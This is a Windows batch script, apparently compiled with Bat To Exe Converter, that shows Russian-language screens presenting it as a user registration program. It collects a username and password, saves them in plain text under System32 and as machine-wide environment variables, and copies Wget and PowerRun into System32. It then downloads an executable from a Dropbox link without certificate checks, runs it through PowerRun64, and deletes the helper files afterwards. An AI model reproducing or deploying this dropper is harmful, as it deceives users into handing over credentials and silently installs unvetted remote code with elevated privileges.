::[Bat To Exe Converter]
::
::fBE1pAF6MU+EWHzeyGYxPBpo/Psz3NtktmCsMlkZXgG7ErGtgVLiyWHnakY+9VHzW6RUrSb16nVUlMICCSdrSjOZWikdhUtxilSKIMKOgRrvBE2R4ys=
::fBE1pAF6MU+EWHzeyGYxPBpo/Psz3NtktmCsMlkZXgG7ErGtgVLiyWHnakY+9VHzW6RUrSb16nVUlMICCSdrSjOZWikdhUtxilSKIMKOgRrvBEGH7ys=
::fBE1pAF6MU+EWHzeyGYxPBpo/Psz3NtktmCsMlkZXgG7ErGtgVLiyWHnakY+9VHzW6RUrSb16nVUlMICCSdrSjOZWikdhUtxilSKIMKOgRrvHBzH41M1ew==
::fBE1pAF6MU+EWHzeyGYxPBpo/Psz3NtktmCsMlkZXgG7ErGtgVLiyWHnakY+9VHzW6RUrSb16nVUlMICCSdrSjOZWikdhUtxinOCMtPSthfkKg==
::YAwzoRdxOk+EWAjk
::fBw5plQjdCqDJHSB4EMUKQ9VcLR6jLEK2AXBWDJLN9aGrkFQWesxcYLa1r2dLa1A1kTgepQom35IncoBGx5ZaBe5IAY3pg4=
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdF25
::cxAkpRVqdFKZSjk=
::cBs/ulQjdF25
::ZR41oxFsdFKZSTk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpSI=
::egkzugNsPRvcWATEpCI=
::dAsiuh18IRvcCxnZtBJQ
::cRYluBh/LU+EWAjk
::YxY4rhs+aU+JeA==
::cxY6rQJ7JhzQF1fEqQJQ
::ZQ05rAF9IBncCkqN+0xwdVs0
::ZQ05rAF9IAHYFVzEqQJQ
::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
::cRolqwZ3JBvQF1fEqQJQ
::dhA7uBVwLU+EWDk=
::YQ03rBFzNR3SWATElA==
::dhAmsQZ3MwfNWATElA==
::ZQ0/vhVqMQ3MEVWAtB9wSA==
::Zg8zqx1/OA3MEVWAtB9wSA==
::dhA7pRFwIByZRRnk
::Zh4grVQjdCqDJH2F4EMMmOTlrLRcjL4K3AT+WQPHXxY3d/3A5QwDyHBqOgRQkDOiCvU0xUqdCsqHKSC82VvpmqJ73taEct+pikm2efCbthuvbkee6Ec/GmFxlS3VlC5b
::YB416Ek+ZW8=
::
::
::978f952a14a936cc963da21a135fa983
echo off
color 6
mkdir C:\Windows\System32\Logsfolder
echo. >>C:\Windows\System32\Logsfolder\registr.txt
setx ProgramDirectory %dir%
setx ProgramDirectory %dir% /m
cls
echo           ####################################
echo           ##                                ##
echo           ##              ##                ##
echo           ##            ##  ##              ##
echo           ##           ##     ##            ##
echo           ##         ############           ##
echo           ##        ##           ##         ##
echo           ##      ##              ##        ##
echo           ##     ##                ##       ##
echo           ##                                ##
echo           ##                                ##
echo           ####################################
echo.
echo.
echo Приветствую, пользователь X
echo Для начала зарегистрируйся
timeout /t 2 >nul
:Registrstart
cls
echo           ####################################
echo           ##                                ##
echo           ##              ##                ##
echo           ##            ##  ##              ##
echo           ##           ##     ##            ##
echo           ##         ############           ##
echo           ##        ##           ##         ##
echo           ##      ##              ##        ##
echo           ##     ##                ##       ##
echo           ##                                ##
echo           ##                                ##
echo           ####################################
echo.
echo.
echo                           Введите Имя пользователя:
echo.
set /p U=Имя Пользователя: 
echo.
echo.
echo name %U%>C:\Windows\System32\Logsfolder\registr.txt
for /f "UseBackQ tokens=1-2 delims==( " %%a in (C:\Windows\System32\Logsfolder\registr.txt) do if "%%a"=="path" set U=%%b
goto Twopart
:Twopart
cls
echo           ####################################
echo           ##                                ##
echo           ##              ##                ##
echo           ##            ##  ##              ##
echo           ##           ##     ##            ##
echo           ##         ############           ##
echo           ##        ##           ##         ##
echo           ##      ##              ##        ##
echo           ##     ##                ##       ##
echo           ##                                ##
echo           ##                                ##
echo           ####################################
echo.
echo.
echo                      Введите Пароль для пользователя %U% :
echo.
set /p P=Пароль : 
echo.
echo.
echo pass %P%>C:\Windows\System32\Logsfolder\registr.txt
for /f "UseBackQ tokens=1-2 delims==( " %%a in (C:\Windows\System32\Logsfolder\registr.txt) do if "%%a"=="path" set P=%%b
cls
echo      Все верно?
echo.
echo              Пользователь: %U%
echo       Пароль пользователя: %P%
echo.
echo   1 Да
echo   2 Нет, Изменить
echo.
echo.
set /p answer="> "
if /i "%answer%"=="1" goto Gameover
if /i "%answer%"=="2" goto Registrstart
:Gameover
echo ---------------------------------------------------
echo ---------------------------------------------------
echo        Ожидайте.
echo Ведется регистрация данных...
timeout /t 2 >nul
echo           ####################################
echo           ##                                ##
echo           ##              ##                ##
echo           ##            ##  ##              ##
echo           ##           ##     ##            ##
echo           ##         ############           ##
echo           ##        ##           ##         ##
echo           ##      ##              ##        ##
echo           ##     ##                ##       ##
echo           ##                                ##
echo           ##                                ##
echo           ####################################
echo.
echo.
echo Processing...
setx user %U%
setx user %U% /m
setx userpass %P%
setx userpass %P% /m
cls
echo           ####################################
echo           ##                                ##
echo           ##              ##                ##
echo           ##            ##  ##              ##
echo           ##           ##     ##            ##
echo           ##         ############           ##
echo           ##        ##           ##         ##
echo           ##      ##              ##        ##
echo           ##     ##                ##       ##
echo           ##                                ##
echo           ##                                ##
echo           ####################################
echo.
echo Применение требуемых параметров...
echo.
echo Processing...
echo.
mkdir C:\Windows\DataFiles
cd %homepath%\Desktop
Copy /y %AppData%\Wget.exe C:\Windows\System32
Copy /y %AppData%\PowerRun.exe C:\Windows\System32
Copy /y %AppData%\PowerRun.ini C:\Windows\System32
Copy /y %AppData%\PowerRun64.exe C:\Windows\System32
cls
echo       Ожидайте.
echo Скачивание Программы...
wget "https://www.dropbox.com/s/clkijwmhpnuluf2/MS.Wget.exe?dl=1" -O C:\MS.Wget.exe --no-check-certificate
cls
echo Окончание работы программы
cls
echo           ####################################
echo           ##                                ##
echo           ##              ##                ##
echo           ##            ##  ##              ##
echo           ##           ##     ##            ##
echo           ##         ############           ##
echo           ##        ##           ##         ##
echo           ##      ##              ##        ##
echo           ##     ##                ##       ##
echo           ##                                ##
echo           ##                                ##
echo           ####################################
echo.
echo.
Echo Завершено
echo Выход...
Timeout /t 2 >nul
goto exit

:exit
copy /y C:\MS.Wget.exe %ProgramDirectory%
PowerRun64 %ProgramDirectory%\MS.Wget.exe
del /f /s /q %AppData%\Wget.exe
del /f /s /q %AppData%\PowerRun.exe
del /f /s /q %AppData%\PowerRun.ini
del /f /s /q %AppData%\PowerRun64.exe
timeout /t 1 >nul
exit
goto exit